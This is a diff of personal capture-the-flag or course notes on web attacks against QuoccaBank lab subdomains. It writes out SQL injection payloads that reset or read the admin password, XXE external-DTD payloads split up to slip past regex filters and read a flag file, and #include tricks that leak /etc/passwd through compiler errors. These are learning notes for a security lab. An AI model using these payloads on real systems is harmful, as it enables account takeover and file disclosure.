@@ -432,9 +432,26 @@ Objectives:
 
 signin subdomain
 
-- Reset -> enter email to get password
-- Login -> makes a request to qdns subdomain
-- Navigate to qdns subdomain
+- Reset -> enter email to get password (can only use zID@quoccabank.com which you own - even though you can change your email to admin@quoccabank.com through Burp Suite)
+
+- Login -> displays IP details (also makes a request to qdns subdomain)
+
+- Navigate to qdns subdomain -> override by registering IP address (from signin) with another domain (TXT record is vulnerable to SQLi)
+
+- Injecting a magic payload into the TXT record, an error is produced when sending a password reset request through the form (before the generated password is issued)
+
+- Probing with a record of `' or 1=1-- )` returns an error "expected 1 arguments, got 4". Further probing with an invalid payload of `' foo --)` reveals the rest of the original query, which expect three more arguments. Examining the behaviour of qdns settings and txt record updates only having an effect when a new reset request is sent, I was able to guess and construct the SQL query used to process the request and update the password: 
+
+  ```sql
+  UPDATE users password=?, reset_details=?, last_reset=?, reset_actor=? where email=?;
+  ```
+
+- Since the invalid payload revealed that I was injecting into the reset_details parameter, I was able to inject the payload `', last_reset=?, reset_actor=? where email=? or email='admin@quoccabank.com' -- )` to reset my account as well as the admin account to have the same password, and logging into the admin account displays the flag.
+
+- Note: resetting the admin may not always be ideal, so it might be better to just retrieve the admin password instead
+
+  - `', last_reset=concat(?, (select password from users where email='admin@quoccabank.com')), reset_actor=? where email=?-- )` doesn't work since MySQL doesn't let you access the table being updated
+  - `', last_reset=concat(?, (select password from (select * from users) as temp where email='admin@quoccabank.com')), reset_actor=? where email=?-- )` displays the admin password which can be logged into
 
 v1.feedifier subdomain
 
@@ -457,7 +474,7 @@ v2.feedifier subdomain
 
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
-  <!DOCTYPE foo [<!ENTITY % load SYSTEM "external dtd (different from current domain)"> %l;]>
+  <!DOCTYPE foo [<!ENTITY % load SYSTEM "external dtd (different from current domain)"> %load;]>
   <rss version="2.0">
   <channel>
     <item>
@@ -477,7 +494,23 @@ v2.feedifier subdomain
 
 v3.feedifier subdomain
 
+- Bypass multiple layers of regex filtering
 
+- Same main xml
+
+- External dtd:
+
+  ```xml-dtd
+  <!ENTITY % p1 "file">
+  <!ENTITY % p2 ":///fl">
+  <!ENTITY % p3 "ag_986133c07ed52690d698ab47a2fd1aef">
+  <!ENTITY % pload "<!ENTITY payload SYSTEM '%p1;%p2;%p3;'>">
+  %pload;
+  ```
+
+  https://youtu.be/gjm6VHZa_8s
+
+  https://github.com/Angus-C-git/SecSheets/blob/master/Web/Injection/XXE/XXE.md
 
 v4.feedifier subdomain
 
@@ -502,17 +535,29 @@ bfd subdomain
 
 gcc subdomain
 
+- Checks uploaded file ends with .c
+- Copies it to /tmp/php?????.c: `cp/mv filename /tmp/php?????.c`
+- Runs gcc to compile it: `gcc /tmp/php?????.c`
+- Binary name strips .c
+- Binary uploaded with UNIXTIMESTAMP_binaryname
+
+
+
+Compiler errors are displayed - `#include "/etc/passwd"` and  `#include "/var/www/html/index.php"` - first line displayed
+
+However, `#include "/var/www/html/flag.php"` displays error that file/directory does not exist
+
+GET request to /upload.php - undefined index: fileToUpload in /quocca-gcc/upload.php
 
 
 
 
 
+#include any uploaded file
 
+Ideas:
 
-
-
-
-
+- Code that is both valid PHP and C -> filename something.php.c -> download link is a .php endpoint which can be executed
 
 
 
